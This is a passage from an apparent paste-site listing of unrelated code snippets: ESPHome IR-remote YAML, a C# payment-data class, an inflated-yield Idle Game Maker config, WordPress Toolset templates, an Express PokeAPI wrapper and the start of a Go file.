  #   name: ""Volume Down""
  #   icon: mdi:remote-tv
  #   lg:
  #     data: ${LG_voldn}
  #     nbits: ${LG_nbits}
  # - platform: remote_receiver
  #   name: ""Channel Up""
  #   icon: mdi:remote-tv
  #   lg:
  #     data: ${LG_chup}
  #     nbits: ${LG_nbits}
  # - platform: remote_receiver
  #   name: ""Channel Down""
  #   icon: mdi:remote-tv
  #   lg:
  #     data: ${LG_chdn}
  #     nbits: ${LG_nbits}
  # - platform: remote_receiver
  #   name: ""Mute""
  #   icon: mdi:remote-tv
  #   lg:
  #     data: ${LG_mute}
  #     nbits: ${LG_nbits}
  # ###
  # - platform: remote_receiver
  #   name: ""Fan power""
  #   icon: mdi:remote
  #   lg:
  #     data: ${FAN_LG_power}
  #     nbits: ${LG_nbits}
  # - platform: remote_receiver
  #   name: ""Fan up""
  #   icon: mdi:remote
  #   lg:
  #     data: ${FAN_LG_up}
  #     nbits: ${LG_nbits}
  # - platform: remote_receiver
  #   name: ""Fan down""
  #   icon: mdi:remote
  #   lg:
  #     data: ${FAN_LG_down}
  #     nbits: ${LG_nbits}
  # - platform: remote_receiver
  #   name: ""Fan turbo""
  #   icon: mdi:remote
  #   lg:
  #     data: ${FAN_LG_turbo}
  #     nbits: ${LG_nbits}
  # - platform: remote_receiver
  #   name: ""Fan auto""
  #   icon: mdi:remote
  #   lg:
  #     data: ${FAN_LG_auto}
  #     nbits: ${LG_nbits}

remote_transmitter:
  pin: D3
  carrier_duty_percent: 50%

# button:
#   - platform: template
#     name: ""Power""
#     icon: mdi:power-cycle
#     on_press:
#       - remote_transmitter.transmit_lg:
#           data: ${LG_power}
#           nbits: ${LG_nbits}
#           repeat:
#             times: 10
#             wait_time: 10ms

api:
  services:
    - service: transmit_lg
      variables:
        code: int
        # nbits: int
      then:
        - remote_transmitter.transmit_lg:
            data: !lambda ""return code;""
            nbits: ${LG_nbits}
            repeat:
              times: 10
              wait_time: 10ms"
yXn1e6Eh,data833,TestGuy1,JSON,Wednesday 7th of February 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '59f66dad43f2ce44c4ccdb4da830214202da24d819d0c1474e13598a064918d6c43bb9362363e5c1a2eb1e7e6e36d634ab67ac58ee5481614fa1c9d43ce98003cac7101d01fdcc63aa8127a3bfd45f86fe67374c76d7cac530ee9ab7723867624f236ea8f16a8ef3821fa2b14c6574b262609edd203be72bb0ad6fef875aff50',
  otherdata: [
    'fc56c21e764b0ab6b71de882f6b48947',
    'bb4eda1c43dadd7ce8949d4f3169dc9d',
    '64a49fc16a46be4fa5225443ec417e63',
    'ef342e7553bc2c4aea25ffe9bfd15363',
    '106ace4061e31617fe94985115d865fb',
    '6cfacc127adef2609929be4bd7af645c',
    '6bd86222f09f60244efc406b59175033',
    '3e3dccac22fea26256207d14baa1ed06'
  ]
}"
c4YJMXtW,PurchaseData,Pro_Unit,C#,Wednesday 7th of February 2024 05:45:07 AM CDT,"using System;

using Game.PaymentsSystem.Data;

using UnityEngine;

namespace Game.PaymentsSystem
{
	[Serializable]
	public class PurchaseData
	{
		/// <summary>
		/// Тип метода оплаты
		/// </summary>
		[SerializeField] private PaymentMethodType _paymentMethodType;

		/// <summary>
		/// Данные метода оплаты
		/// </summary>
		[field: SerializeReference] public IPaymentMethodData PaymentMethodData { get; private set; }

		/// <summary>
		/// Метод для валидации данных
		/// </summary>
		public void Validate()
		{
			PaymentMethodData = _paymentMethodType switch
			{
				PaymentMethodType.Free when PaymentMethodData is not FreePaymentMethodData =>
					new FreePaymentMethodData(),
				PaymentMethodType.Currency when PaymentMethodData is not CurrencyPaymentMethodData =>
					new CurrencyPaymentMethodData(),
				PaymentMethodType.InAppPurchase when PaymentMethodData is not InAppPurchasePaymentData =>
					new InAppPurchasePaymentData(),
				_ => PaymentMethodData
			};
		}
	}
}
"
PHxzfHUR,Idle Game Maker Hacked,AkashiKha,JavaScript,Wednesday 7th of February 2024 04:27:21 AM CDT,"Let's make a game!
	name:Bunny Clicker
	by:Orteil
	desc:This is a simple idle game to showcase some of the basic functionalities of Idle Game Maker.<//>Make bunnies and shoot for the stars!
	created:25/7/2017
	updated:24/10/2017
	version:1

Settings
	background:stuff/meadow.jpg
	building cost increase:115%
	building cost refund:50%
	spritesheet:icons, 48 by 48, stuff/bunnyIcons.png
	stylesheet:stuff/bigBlue.css

Layout
	use default
		
Buttons
	*bunnyButton
		name:Make a bunny
		desc:Click this little bunny to get more bunnies!
		on click:anim icon wobble
		on click:yield 99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999 bunny
		on click:yield 99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999 goldenCarrot
		icon:stuff/bunny.png
		no text
		class:bigButton hasFlares
		icon class:shadowed
		tooltip origin:bottom
		tooltip class:red
		
Resources
	*bunny|bunnies
		name:Bunny|Bunnies
		desc:These are your bunnies. You can use them to purchase things. Your goal is to have as many bunnies as possible!
		icon:icons[0,0]
		class:noBackground
		show earned
		
	*goldenCarrot|goldenCarrots
		name:Golden carrot|Golden carrots
		desc:These shiny carrots are terribly rare, terribly precious and terribly delicious!
		icon:icons[0,1]
		class:noBackground
		hidden when 0
		
Shinies
	*luckyBunny
		on click:log Woop
		movement:onRight moveLeft fade bounce:0.05
		frequency:60
		frequency variation:30
		icon:stuff/luckyBunny.png
		class:bigButton
		on click:
			$boost=1
			if (have clover) $boost=4
			if (chance(25%))
				//get at least 7, or between 1 and 3 minutes of our bunny production
				$amount=max(7,random(bunnies:ps*60*1,bunnies:ps*60*3))*$boost
				toast The lucky bunny grants you<//><b>[$amount] bunnies</b>.
				yield $amount bunnies
			else
				$amount=1*$boost
				toast The lucky bunny grants you<//><b>[$amount] golden carrot[s?$amount]</b>!
				yield $amount goldenCarrot
			end
		end

Buildings
	*TEMPLATE
		on click:anim glow
		
	*cage|cages
		name:Rabbit cage|Rabbit cages
		desc:A tiny little cage.<//><b>Effect:</b><.>Produces 1 rabbit every 10 seconds.
		icon:icons[3,0]
		cost:1 bunnies
		on tick:yield 0.1 bunny
		unlocked
	
	*hutch|hutches
		name:Rabbit hutch|Rabbit hutches
		desc:A bit roomier than a cage, with enough space to hop around.<//><b>Effect:</b><.>Produces 1 rabbit every 2 seconds.
		icon:icons[3,1]
		cost:1 bunnies
		on tick:yield 0.5 bunnies
		req:100 bunnies:earned
	
	*coop|coops
		name:Rabbit coop|Rabbit coops
		desc:A much nicer rabbit home where full bunny families can live.<//><b>Effect:</b><.>Produces 5 rabbits per second.
		icon:icons[3,2]
		cost:1 bunnies
		on tick:yield 5 bunnies
		req:600 bunnies:earned
	
	*pen|pens
		name:Rabbit pen|Rabbit pens
		desc:A lovely enclosure with plenty of green space.<//><b>Effect:</b><.>Produces 12 rabbits per second.
		icon:icons[3,3]
		cost:1 bunnies
		on tick:yield 12 bunnies
		req:4000 bunnies:earned
	
	*meadow|meadows
		name:Rabbit meadow|Rabbit meadows
		desc:A wide open space full of shade and lush grass.<//><b>Effect:</b><.>Produces 90 rabbits per second.
		icon:icons[3,4]
		cost:1 bunnies
		on tick:yield 90 bunnies
		req:20000 bunnies:earned
	
	*village|villages
		name:Rabbit village|Rabbit villages
		desc:Your bunnies are building their own villages now!<//><b>Effect:</b><.>Produces 300 rabbits per second.
		icon:icons[3,5]
		cost:1 bunnies, 1 goldenCarrot
		on tick:yield 300 bunnies
		req:200000 bunnies:earned and independenceDay
		
	*city|cities
		name:Rabbit city|Rabbit cities
		desc:A bustling little city, populated with busy rabbits.<//><b>Effect:</b><.>Produces 1000 rabbits per second.
		icon:icons[3,6]
		cost:1 bunnies, 1 goldenCarrots
		on tick:yield 1000 bunnies
		req:3000000 bunnies:earned and independenceDay
		
	*citadel|citadels
		name:Moon citadel|Moon citadels
		desc:An ornate palace standing on the moon, ruled by bunny kings and queens and staffed with royal bunny guards.<//><b>Effect:</b><.>Produces 4000 rabbits per second.
		icon:icons[3,7]
		cost:1 bunnies, 1 goldenCarrots
		on tick:yield 4000 bunnies
		on tick:if (have moonGardens) yield 0.01 goldenCarrot
		req:70000000 bunnies:earned and independenceDay
		
	*fortress
		name:Freedom fortress
		text:Freedom fortress ([this]%)
		desc:A huge bunny castle. A monument to the adventurous spirit of bunnykind, which will take time and effort to complete.<//><b>The fortress is [this]% complete.</b>
		icon:icons[3,8]
		cost:1 bunnies, 1 goldenCarrots
		req:70000000 bunnies:earned and independenceDay
		limit:100
		cost increase:105%
		
Upgrades
	*TEMPLATE
		on click:anim glow
	
	//food upgrades
	//inspiration : http://rabbit.org/suggested-vegetables-and-fruits-for-a-rabbit-diet/
	
	*parsley
		name:Parsley
		desc:A nice little supplement to your bunnies' diet.<//><b>Effect:</b><.>+1 bunny/click
		icon:icons[1,1]
		cost:1 bunnies
		passive:increase bunny yield of bunnyButton by 1
		req:10 bunnies:earned
		
	*spinach
		name:Spinach
		desc:Big tasty leaves, perfect for hungry bunnies.<//><b>Effect:</b><.>+1 bunny/click
		icon:icons[1,2]
		cost:1 bunnies
		passive:increase bunny yield of bunnyButton by 1
		req:50 bunnies:earned
		
	*lettuce
		name:Lettuce
		desc:Frilly greens loved by all bunnies.<//><b>Effect:</b><.>+1 bunny/click
		icon:icons[1,3]
		cost:1 bunnies
		passive:increase bunny yield of bunnyButton by 1
		req:200 bunnies:earned
		
	*broccoli
		name:Broccoli
		desc:Crunchy greens that look like little trees.<//><b>Effect:</b><.>bunnies/click x2<.>bunny production +5%
		icon:icons[1,4]
		cost:1 bunnies
		passive:multiply bunny yield of bunnyButton by 2
		passive:multiply yield of bunnies by 1.05
		req:1000 bunnies:earned
		
	*apple
		name:Apple
		desc:Nice pieces of juicy red apples.<//><b>Effect:</b><.>bunnies/click x1.5<.>bunny production +5%
		icon:icons[1,5]
		cost:1 bunnies
		passive:multiply bunny yield of bunnyButton by 1.5
		passive:multiply yield of bunnies by 1.05
		req:1000 bunnies:earned
		
	*radish
		name:Radish
		desc:Purple, crunchy, and strangely spicy.<//><b>Effect:</b><.>bunnies/click x1.5<.>bunny production +5%
		icon:icons[1,6]
		cost:1 bunnies
		passive:multiply bunny yield of bunnyButton by 1.5
		passive:multiply yield of bunnies by 1.05
		req:10000 bunnies:earned
		
	*mint
		name:Mint
		desc:Tasty, and gives your bunnies a lovely breath.<//><b>Effect:</b><.>bunnies/click x1.5<.>bunny production +5%
		icon:icons[1,7]
		cost:1 bunnies
		passive:multiply bunny yield of bunnyButton by 1.5
		passive:multiply yield of bunnies by 1.05
		req:50000 bunnies:earned
		
	*chard
		name:Chard
		desc:Broad leaves that make for a tasty salad.<//><b>Effect:</b><.>bunnies/click x1.5<.>bunny production +5%
		icon:icons[1,8]
		cost:1 bunnies
		passive:multiply bunny yield of bunnyButton by 1.5
		passive:multiply yield of bunnies by 1.05
		req:100000 bunnies:earned
		
	*cherry
		name:Cherry
		desc:Your bunnies look like little vampires when they start munching on these!<//><b>Effect:</b><.>bunnies/click x1.5<.>bunny production +5%
		icon:icons[1,9]
		cost:1 bunnies
		passive:multiply bunny yield of bunnyButton by 1.5
		passive:multiply yield of bunnies by 1.05
		req:500000 bunnies:earned
		
	*carrot
		name:Carrot
		desc:The quintessential rabbit food! Crunchy, orange, and perfect.<//><b>Effect:</b><.>bunnies/click x2<.>bunny production +10%
		icon:icons[1,0]
		cost:1 bunnies
		passive:multiply bunny yield of bunnyButton by 2
		passive:multiply yield of bunnies by 1.1
		req:1000000 bunnies:earned
	
	//building upgrades
	
	*buildingUpgrade1
		name:Sippy bottles
		desc:Your bunnies can drink their fill!<//><b>Effect:</b><.>rabbit cage production x2<.>rabbit hutch production x2<.>rabbit coop production x2
		icon:icons[2,0] icons[3,0]
		cost:1 bunnies
		passive:multiply yield of cage by 2
		passive:multiply yield of hutch by 2
		passive:multiply yield of coop by 2
		req:(cages>=10 or hutches>=10 or coops>=10)
		
	*buildingUpgrade2
		name:Prime grade hay
		desc:Not just for horses anymore!<//><b>Effect:</b><.>rabbit cage production x2<.>rabbit hutch production x2<.>rabbit coop production x2
		icon:icons[2,0] icons[3,1]
		cost:1 bunnies
		passive:multiply yield of cage by 2
		passive:multiply yield of hutch by 2
		passive:multiply yield of coop by 2
		req:(cages>=50 or hutches>=50 or coops>=50)
		
	*buildingUpgrade3
		name:Shredded newspapers
		desc:You'd think they just poop on these, but they really enjoy reading the Sunday comics.<//><b>Effect:</b><.>rabbit cage production x2<.>rabbit hutch production x2<.>rabbit coop production x2
		icon:icons[2,0] icons[3,2]
		cost:1 bunnies
		passive:multiply yield of cage by 2
		passive:multiply yield of hutch by 2
		passive:multiply yield of coop by 2
		req:(cages>=100 or hutches>=100 or coops>=100)
		
	*buildingUpgrade4
		name:Pretty fences
		desc:Just the right size so your bunnies can peek through but not hop over!<//><b>Effect:</b><.>rabbit pen production x2<.>rabbit meadow production x2
		icon:icons[2,0] icons[3,3]
		cost:1 bunnies
		passive:multiply yield of pen by 2
		passive:multiply yield of meadow by 2
		req:(pens>=10 or meadows>=10)
		
	*buildingUpgrade5
		name:Bunny playground
		desc:If your bunnies are outside, they might as well get some exercise!<//><b>Effect:</b><.>rabbit pen production x2<.>rabbit meadow production x2
		icon:icons[2,0] icons[3,4]
		cost:1 bunnies
		passive:multiply yield of pen by 2
		passive:multiply yield of meadow by 2
		req:(pens>=50 or meadows>=50)
		
	*buildingUpgrade6
		name:Bunny TVs
		desc:Televisions that broadcast bunny cartoons, bunny sitcoms, and bunny news bulletins.<//><b>Effect:</b><.>rabbit village production x2<.>rabbit city production x2
		icon:icons[2,0] icons[3,5]
		cost:1 bunnies
		passive:multiply yield of village by 2
		passive:multiply yield of city by 2
		req:(villages>=10 or cities>=10)
		
	*buildingUpgrade7
		name:Wee little bunny cars
		desc:Your bunnies drive around in these. How nice!<//><b>Effect:</b><.>rabbit village production x2<.>rabbit city production x2
		icon:icons[2,0] icons[3,6]
		cost:1 bunnies
		passive:multiply yield of village by 2
		passive:multiply yield of city by 2
		req:(villages>=50 or cities>=50)
		
	*buildingUpgrade8
		name:Soothing moon crystals
		desc:Just really nice to be around.<//><b>Effect:</b><.>moon citadel production x2
		icon:icons[2,0] icons[3,7]
		cost:1 bunnies
		passive:multiply yield of citadel by 2
		req:10 citadels
		
	//golden carrot upgrades
	
	*goldenTouch
		name:Golden touch
		desc:The delicate art of finding vegetables made of precious metals.<//><b>Effect:</b><.>1% chance of gaining 1 golden carrot per bunny click
		icon:icons[2,5]
		cost:1 goldenCarrot
		req:1 goldenCarrot:earned
		
	*rabbitHaste
		name:Rabbit's haste
		desc:I'm late! I'm late! For a very important date!<//><b>Effect:</b><.>lucky bunnies appear 30% more often
		icon:icons[2,6]
		passive:multiply frequency of luckyBunny by 0.7
		cost:1 goldenCarrots
		req:1 goldenCarrot:earned
	
	*independenceDay
		name:Independence day
		desc:Your bunnies are making their first step towards declaring their independence from the oppressive shackles of pens and cages.<//><b>Effect:</b><.>unlocks new buildings
		icon:icons[2,7]
		cost:1 goldenCarrots
		req:5 goldenCarrots:earned
		
	*clover
		name:Clover
		desc:A delicious herb that tastes lucky.<//><b>Effect:</b><.>lucky bunny effects are 4 times more powerful
		icon:icons[2,8]
		cost:1 goldenCarrots
		req:50 goldenCarrots:earned
		
	*moonGardens
		name:Moon gardens
		desc:The royal botanists in your moon citadels have found new ways of cultivating plants in reduced gravity!<//><b>Effect:</b><.>moon citadels now produce 1 golden carrot every 100 seconds
		icon:icons[2,9]
		cost:1 goldenCarrots
		req:50 goldenCarrots:earned
		
Achievements
	*TEMPLATE
		on click:anim glow
		
	*bunnyAchiev1
		name:Run rabbit run
		desc:Have <b>1</b> bunny.
		req:1 bunny
		icon:icons[2,4] icons[0,2] icons[0,6]
	*bunnyAchiev2
		name:Bunniest home videos
		desc:Have <b>1000</b> bunnies.
		req:1 bunnies
		icon:icons[2,4] icons[0,3] icons[0,6]
	*bunnyAchiev3
		name:You got buns, hun
		desc:Have <b>1000000</b> bunnies.
		req:1 bunnies
		icon:icons[2,4] icons[0,4] icons[0,6]
		
	*clickAchiev1
		name:That tickles
		desc:Click the bunny <b>10</b> times.
		req:1 bunnyButton clicks
		icon:icons[2,2] icons[0,2] icons[0,6]
	*clickAchiev2j
		name:Don't squeeze me I'll fart
		desc:Click the bunny <b>100</b> times.
		req:1 bunnyButton clicks
		icon:icons[2,2] icons[0,3] icons[0,6]
	*clickAchiev3
		name:You're cruising for a bruising, dude
		desc:Click the bunny <b>2000</b> times.
		req:1 bunnyButton clicks
		icon:icons[2,2] icons[0,4] icons[0,6]
		
	*bunnyPsAchiev1
		name:Be vewy vewy quiet
		desc:Produce <b>10</b> bunnies per second.
		req:1 bunnies per second
		icon:icons[2,3] icons[0,2] icons[0,6]
	*bunnyPsAchiev2
		name:Hop and a skip
		desc:Produce <b>1000</b> bunnies per second.
		req:1 bunnies per second
		icon:icons[2,3] icons[0,3] icons[0,6]
	*bunnyPsAchiev3
		name:Go forth and multiply
		desc:Produce <b>100000</b> bunnies per second.
		req:1 bunnies per second
		icon:icons[2,3] icons[0,4] icons[0,6]
		
	*carrotAchiev1
		name:Isn't it neat
		desc:Have <b>1</b> golden carrot.
		req:1 goldenCarrot
		icon:icons[0,1] icons[0,2]
	*carrotAchiev2
		name:All that glitters
		desc:Have <b>100</b> golden carrots.
		req:1 goldenCarrot
		icon:icons[0,1] icons[0,3]
	*carrotAchiev3
		name:Zero nutritional value
		desc:Have <b>1000</b> golden carrots.
		req:1 goldenCarrot
		icon:icons[0,1] icons[0,4]
	
	*fortressAchiev
		name:Freedom!
		desc:Complete building the <b>freedom fortress</b>.<//>This is it. You beat the game!
		req:1 fortress
		icon:icons[3,8] icons[0,4]
		"
aya5CiJh,Toolset View list routes Max (Ivan),maxworkingwell,HTML 5,Wednesday 7th of February 2024 04:01:26 AM CDT,"[wpv-layout-start]
[wpv-items-found]
<!-- wpv-loop-start -->
<wpv-loop>
<div class=""row"">
<div class=""col-sm-12"">

<div class=""container-fluid"">
    <div class=""panel-group"">
      <div class=""panel-heading"">
        <span>
          <a style=""color:black;font-weight:400;"" data-toggle=""collapse"" href=""#[wpv-post-slug]"">
            
<!--========    PRIMA RIGA  ========-->
<div class=""row"">  
  <div class=""col-xs-1""><p>[types field='route-position' format='FIELD_VALUE'][/types]</p></div>
  <div class=""col-xs-2 sector-icons"">[wpv-view name=""route-quick-details-2""]</div>
  <div class=""col-xs-3""><p>[wpv-post-title output=""sanitize""]</p></div>
  <div class=""col-xs-2""><p style=""float:right"">[types field='grade'][/types]</p></div>
  <div class=""col-xs-2""><p style=""float:right"">[types field='height'][/types] m</p></div>
  <div class=""col-xs-2""><a href=""[wpv-post-url]""><img src=""https://climbingsardinia.com/topos/icons/plus.png"" alt=""View Route or Add Performance"" title=""Add your performance""width=""20px;"" style=""float:right"" /></a></div>
</div>  
</a>  
        </span>
</div>

<div id=""[wpv-post-slug]"" class=""panel-collapse collapse"" style=""padding:0 10px;""> 
  
  <!--========   RIGA ICONE     ========-->
  	<div class=""row"" style=""padding:10px 0;""> 
    	<div class=""col-xs-3 sector-icons center"">[types field='danger'][/types]</div>
    	<div class=""col-xs-6 smallfont center""><img style=""max-width:30px;"" src=""https://climbingitaly.com/icons/[wpv-conditional if=""( $(wpcf-climbing-type) eq '1' )""]bolted.png"" alt=""Sport climbing""/>SPORT route[/wpv-conditional][wpv-conditional if=""( $(wpcf-climbing-type) eq '2' )""]trad.png"" />TRAD route[/wpv-conditional][wpv-conditional if=""( $(wpcf-climbing-type) eq '3' )""]bolted.png"" alt=""Bolted multi-pitch""/>Multi-pitch BOLTED[/wpv-conditional][wpv-conditional if=""( $(wpcf-climbing-type) eq '4' )""]trad.png"" />Multi-pitch TRAD[/wpv-conditional][wpv-conditional if=""( $(wpcf-climbing-type) eq '5' )""]boulder.png"" />Boulder[/wpv-conditional][wpv-conditional if=""( $(wpcf-climbing-type) eq '6' )""]DWS.png"" />DWS[/wpv-conditional][wpv-conditional if=""( $(wpcf-climbing-type) eq '7' )""]mixed.png"" />Multi-pitch PARTIALLY BOLTED[/wpv-conditional]</div>
      	<div class=""col-xs-3 center"">[wpv-view name=""my-route-favourite-icon""]</div> 	
      </div>
  <!--========     RIGA DETTAGLI    ========-->
    [wpv-conditional if=""( $(wpcf-bolter-s) eq '' ) AND ( $(wpcf-year-bolted) eq '' ) AND ( $(wpcf-year-re-bolted) eq '' ) AND ( $(wpcf-equipment-used) eq '' )"" evaluate=""false""]<div class=""row dash"">
      <div class=""col-xs-3 smallfont center""><p style=""color:grey;"">Created by</p><b>[types field='bolter-s'][/types]</b></div>
        <div class=""col-xs-3 smallfont center""><p style=""color:grey;"">Year</p><b>[types field='year-bolted'][/types]</b></div>  
    	<div class=""col-xs-3 smallfont center""><p style=""color:grey;"">Last re-bolted</p><b>[types field='year-re-bolted'][/types]</b></div>  
    	<div class=""col-xs-3 smallfont center""><p style=""color:grey;"">Equipment</p><b>[types field='equipment-used'][/types]</b></div>  
      </div>
[/wpv-conditional]
   <!--========    RIGA MULTI-PITCH     ========-->
	  [wpv-conditional if=""( $(wpcf-climbing-type) eq '3' ) OR ( $(wpcf-climbing-type) eq '4' ) OR ( $(wpcf-climbing-type) eq '7' )""]<div class=""row dash"">
      <div class=""col-xs-3 smallfont center""><p style=""color:grey;"">Obligatory</p><b>[types field='oblig-grade'][/types]</b></div>
        <div class=""col-xs-3 smallfont center""><p style=""color:grey;"">n. of pitches</p><b>[types field='n-pitches' output='raw'][/types]</b></div>  
    	<div class=""col-xs-3 smallfont center""><p style=""color:grey;"">Pitches grades</p><b>[types field='pitches-grades'][/types]</b></div>  
    	<div class=""col-xs-3 smallfont center""><p style=""color:grey;"">Pitches lenght</p><b>[types field='pitches-length'][/types]</b></div>  
  	</div>[/wpv-conditional]
  
  <!--========     RIGA NOTE       ========-->
 [wpv-conditional if=""( $(wpcf-notes) ne '' )""]
  <div class=""row dash""> 
    <div class=""col-xs-12 note""> <b>NOTE:</b> [types field='notes'][/types]</div> 
  </div>
  [/wpv-conditional]
  
   <!--========        PREVIOUS ASCENTS          ========--> 
  
         [wpv-view name=""other-climbers-ascents-quick-view""]
  
   <!--========    ULTIMA RIGA PER GLI EDITORI     ========-->
[wpv-conditional if=""( '[wpv-current-user info='role']' eq 'administrator' ) OR ( '[wpv-current-user info='role']' eq 'editor' ) OR ( '[wpv-current-user info='role']' eq 'author' )""]
<div class=""row dash"" id=""add-edit-note"" style=""padding: 0 10px; border-top: 1px dashed lightgray;""> 
<div class=""col-xs-4 smallfont center"">
<p><a class=""cred-edit-post"" href=""/route/[wpv-post-slug]/?layout_id=4847"" target=""_blank"">Add/Edit note</a></p>
</div>
<div class=""col-xs-4 smallfont center"">
<p><a class=""cred-edit-post"" href=""/route/[wpv-post-slug]/?layout_id=4048"" target=""_blank"">Edit route</a></p>
</div>
<div class=""col-xs-4 smallfont center"">[cred_delete_post_link action=""trash"" text=""Delete"" class='cred-refresh-after-delete' message_after=""Post deleted"" message=""Are you sure you want to delete this post?"" message_show=""1""]</div>
</div> 
[/wpv-conditional]
</div>
</div>
</div>
<hr id=""routes-separ"" />

</div>  
</div>
</wpv-loop>
<!-- wpv-loop-end -->
[/wpv-items-found]
[wpv-no-items-found]
<strong>[wpml-string context=""wpv-views""]It's a bit weird... but there's no routes on this sector[/wpml-string]</strong>
[/wpv-no-items-found]
[wpv-layout-end]"
2AkEMmVA,TooletForm create new route (Ivan),maxworkingwell,HTML 5,Wednesday 7th of February 2024 03:57:40 AM CDT,"[credform class='cred-form cred-keep-original']
	[cred_field field='form_messages' value='' class='alert alert-warning']

<div class=""row hide"">
	<div class=""col-sm-12"">
      [cred_field field='@sector_route.parent' class='form-control' output='bootstrap' value='[wpv-post-id]'] 
      [cred_field field='@settore-sicilia-route.parent' class='form-control' output='bootstrap' value='[wpv-post-id]']
      
[wpv-conditional if=""( '[wpv-post-type]' eq '/sicilia' )""]<input type=""text"" id=""rel-slug"" name=""rel-slug"" value=""settore-sicilia-route"">
[/wpv-conditional]

[wpv-conditional if=""( '[wpv-post-type]' eq '/sardegna' )""]<input type=""text"" id=""rel-slug"" name=""rel-slug"" value=""sector_route"">
[/wpv-conditional]
    </div>
</div>
<div class=""row"" style=""text-align:center;"">
  	<div class=""col-sm-3"" style=""margin-bottom:10px;"">[cred_field field='route-position' force_type='field' class='form-control' output='bootstrap']</div>
	<div class=""col-sm-3"" style=""margin-bottom:10px;"">[cred_field field='post_title' class='form-control' output='bootstrap' placeholder='Route Name']</div>
	<div class=""col-sm-3"" style=""margin-bottom:10px;"">[cred_field field='grade' force_type='field' class='form-control' output='bootstrap']</div>
    <div class=""col-sm-3"">[cred_field field='height' force_type='field' class='form-control' output='bootstrap']</div> 
</div>
<p></p>
<div class=""row"">
 	<div class=""col-sm-3""><label>Climbing Type</label>[cred_field field='climbing-type' force_type='field' class='form-control' output='bootstrap']</div>
    <div class=""col-sm-3"" style=""margin-bottom:10px;""><label>Belongs to img.</label>[cred_field field='@image-route.parent' class='form-control' output='bootstrap' select_text='--- not set ---']</div>
    <div class=""col-sm-6"">[cred_field field='path' force_type='field' class='form-control' output='bootstrap']</div>
</div>
<p></p>
[cred_show_group if=""( $(climbing-type) eq '1' ) OR ( $(climbing-type) eq '2' ) OR ( $(climbing-type) eq '3' ) OR ( $(climbing-type) eq '4' ) OR ( $(climbing-type) eq '7' )"" mode=""fade-slide""]
<div class=""row"">
	<div class=""col-sm-3"" style=""margin-bottom:10px;"">[cred_field field='bolter-s' force_type='field' class='form-control' output='bootstrap']</div>
  	<div class=""col-sm-2"" style=""margin-bottom:10px;"">[cred_field field='year-bolted' force_type='field' class='form-control' output='bootstrap']</div>
	<div class=""col-sm-2"">[cred_field field='year-re-bolted' force_type='field' class='form-control' output='bootstrap']</div>
	<div class=""col-sm-3""><label>Equipment</label>[cred_field field='equipment-used' force_type='field' class='form-control' output='bootstrap']</div>
  	<div class=""col-sm-2""><label>Dangers?</label>[cred_field field=""danger"" force_type=""field"" class=""form-control"" output=""bootstrap""]</div> 	
</div>
[/cred_show_group]
<p></p>
[cred_show_group if=""( $(climbing-type) eq '3' ) OR ( $(climbing-type) eq '4' ) OR ( $(climbing-type) eq '7' )"" mode=""fade-slide""]<div class=""row"">
  	<div class=""col-sm-3"" style=""margin-bottom:10px;"">[cred_field field='pitches-length' force_type='field' class='form-control' output='bootstrap']</div>
  	<div class=""col-sm-3"" style=""margin-bottom:10px;"">[cred_field field='n-pitches' force_type='field' class='form-control' output='bootstrap']</div>
    <div class=""col-sm-3"">[cred_field field='pitches-grades' force_type='field' class='form-control' output='bootstrap']</div>
  	<div class=""col-sm-3""><label>Obligatory</label>[cred_field field='oblig-grade' force_type='select' class='form-control' output='bootstrap']</div>
    
</div>[/cred_show_group]
<p></p>
<div class=""row"">
 	<div class=""col-sm-12"">[cred_field field='notes' force_type='field' class='form-control' output='bootstrap']</div>
</div>
<div class=""row"" style=""padding:15px 0;""> 
	[cred_field field='form_submit' value='Submit' urlparam='' class='btn btn-primary btn-lg' output='bootstrap']
</div>
[/credform]"
H8nGPKWE,Untitled,Xfox,JavaScript,Wednesday 7th of February 2024 03:06:46 AM CDT,"const express = require(""express"");
const axios = require(""axios"");
const bodyParser = require(""body-parser"");

const app = express();
app.use(bodyParser.json()); // for parsing application/json

app.get(""/pokemon/name/:name"", async (req, res) => {
  const { name } = req.params;
  try {
    const response = await axios.get(
      `https://pokeapi.co/api/v2/pokemon/${name}`
    );
    res.json(response.data);
  } catch (error) {
    res.status(404).json({ message: ""Pokémon not found"" });
  }
});

app.get(""/pokemon/type/:type"", async (req, res) => {
  const { type } = req.params;
  try {
    const response = await axios.get(`https://pokeapi.co/api/v2/type/${type}`);
    const pokemonList = response.data.pokemon.map((p) => p.pokemon.name);
    res.json({ type: type, pokemon: pokemonList });
  } catch (error) {
    res.status(404).json({ message: ""Type not found"" });
  }
});

app.get(""/openapi.json"", (req, res) => {
  res.json({
    openapi: ""3.0.0"",
    info: {
      title: ""Pokémon API for GPT"",
      version: ""1.0.0"",
      description: ""This API allows you to fetch Pokémon by name or type."",
    },
    servers: [
      {
        url: ""https://<your-runkit-notebook-url>.runkit.sh"",
        description: ""Primary server"",
      },
    ],
    paths: {
      ""/pokemon/name/{name}"": {
        get: {
          operationId: ""getPokemonByName"",
          summary: ""Get Pokémon by name"",
          parameters: [
            {
              name: ""name"",
              in: ""path"",
              required: true,
              description: ""The name of the Pokémon"",
              schema: { type: ""string"" },
            },
          ],
          responses: {
            200: { description: ""Successful operation"" },
            404: { description: ""Pokémon not found"" },
          },
        },
      },
      ""/pokemon/type/{type}"": {
        get: {
          operationId: ""getPokemonByType"",
          summary: ""Get Pokémon by type"",
          parameters: [
            {
              name: ""type"",
              in: ""path"",
              required: true,
              description: ""The type of Pokémon"",
              schema: { type: ""string"" },
            },
          ],
          responses: {
            200: { description: ""Successful operation"" },
            404: { description: ""Type not found"" },
          },
        },
      },
    },
  });
});

// Define the port to listen on
const port = process.env.PORT || 3000; // Runkit will provide a port

// Make the app listen on the port
app.listen(port, () => console.log(`Server is running on port ${port}`));
"
vt43m0w4,contoh skrip code,Amru_Fakharullah,Go,Wednesday 7th of February 2024 02:41:03 AM CDT,"package cronjobs

import (
	""fmt""
	""github.com/bwmarrin/discordgo""
	""github.com/go-zoox/fetch""
	""github.com/gopxl/beep""
	""github.com/gopxl/beep/mp3""
	""github.com/gopxl/beep/speaker""
	""github.com/lactobasilusprotectus/go-discord/internal/sporact""
	""github.com/lactobasilusprotectus/go-discord/internal/util/JsonParser""
	config2 ""github.com/lactobasilusprotectus/go-discord/pkg/config""
	""log""
	""net/url""
	""os""
	""time""
)

var (
